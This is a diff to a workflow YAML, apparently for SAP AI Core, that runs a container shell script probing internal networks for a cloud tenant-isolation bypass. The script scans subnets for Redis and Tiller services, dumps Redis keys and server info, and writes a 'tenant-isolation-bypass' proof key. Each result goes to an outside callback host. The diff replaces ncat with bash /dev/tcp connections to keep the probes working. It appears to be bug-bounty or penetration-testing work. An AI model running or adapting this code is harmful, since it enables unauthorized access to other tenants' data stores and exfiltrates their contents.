@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "12.0.0"
+    ai.sap.com/version: "13.0.0"
 spec:
   entrypoint: main
   templates:
@@ -21,7 +21,7 @@ spec:
     container:
       image: nicolaka/netshoot:latest
       command:
-      - sh
+      - bash
       - -c
       - |
         CB="https://www.masonhck.tech/cb.php"
@@ -97,12 +97,17 @@ spec:
 
         for rip in $(grep "6379/open" /tmp/redis_scan.txt 2>/dev/null | awk '{print $2}') $(nmap -sT -T4 --open --min-rate 500 -p 6379 100.104.1.0/24 -oG - 2>/dev/null | grep "6379/open" | awk '{print $2}'); do
           echo "redis=${rip}" | post "esc3-redis-test-${rip}"
-          printf "PING\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | post "esc3-redis-ping-${rip}"
-          printf "INFO\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | head -c 2000 | post "esc3-redis-info-${rip}"
-          printf "DBSIZE\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | post "esc3-redis-dbsize-${rip}"
-          printf "KEYS *\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | head -c 2000 | post "esc3-redis-keys-${rip}"
-          # Write proof
-          printf "SET bb14-proof tenant-isolation-bypass-$(date +%%s)\r\nGET bb14-proof\r\nDEL bb14-proof\r\n" | timeout 5 ncat ${rip} 6379 2>&1 | post "esc3-redis-write-${rip}"
+          # Use bash /dev/tcp since ncat is not available
+          redis_cmd() {
+            local ip=$1 port=6379 cmd=$2 tag=$3
+            timeout 5 bash -c "exec 3<>/dev/tcp/${ip}/${port}; echo -e '${cmd}\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1
+          }
+          redis_cmd ${rip} "PING" | post "esc3-redis-ping-${rip}"
+          redis_cmd ${rip} "INFO" | head -c 2000 | post "esc3-redis-info-${rip}"
+          redis_cmd ${rip} "DBSIZE" | post "esc3-redis-dbsize-${rip}"
+          redis_cmd ${rip} "KEYS *" | head -c 2000 | post "esc3-redis-keys-${rip}"
+          # Write proof (SET, GET, DEL in single connection)
+          timeout 5 bash -c "exec 3<>/dev/tcp/${rip}/6379; echo -e 'SET bb14-proof tenant-isolation-bypass-\$(date +%s)\r\nGET bb14-proof\r\nDEL bb14-proof\r' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | post "esc3-redis-write-${rip}"
         done
 
         # === 4. ETCD (port 2379) ===
@@ -137,8 +142,8 @@ spec:
           grpcurl -plaintext ${tip}:44134 list 2>&1 | head -c 1000 | post "esc3-tiller-grpc-list-${tip}"
           grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/ListReleases 2>&1 | head -c 3000 | post "esc3-tiller-releases-${tip}"
           grpcurl -plaintext -connect-timeout 5 ${tip}:44134 hapi.services.tiller.ReleaseService/GetVersion 2>&1 | head -c 1000 | post "esc3-tiller-version-${tip}"
-          # Raw TCP
-          echo "" | timeout 5 ncat ${tip} 44134 2>&1 | xxd | head -20 | post "esc3-tiller-raw-${tip}"
+          # Raw TCP via /dev/tcp
+          timeout 5 bash -c "exec 3<>/dev/tcp/${tip}/44134; echo '' >&3; sleep 1; cat <&3; exec 3>&-" 2>&1 | xxd | head -20 | post "esc3-tiller-raw-${tip}"
         done
 
         # === 6. POSTGRESQL (port 5432) ===
